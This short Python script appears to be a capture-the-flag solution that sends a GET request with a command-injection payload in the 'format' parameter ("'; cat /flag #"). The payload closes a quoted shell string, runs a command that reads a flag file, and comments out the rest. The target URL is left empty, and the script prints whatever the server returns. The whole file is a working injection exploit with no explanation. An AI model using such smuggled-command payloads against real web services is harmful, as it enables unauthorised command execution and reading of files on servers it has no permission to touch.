import requests

url = ""

r = requests.get(
    url,
    params = {
        "format": "'; cat /flag #",
    },
)

print(r.text)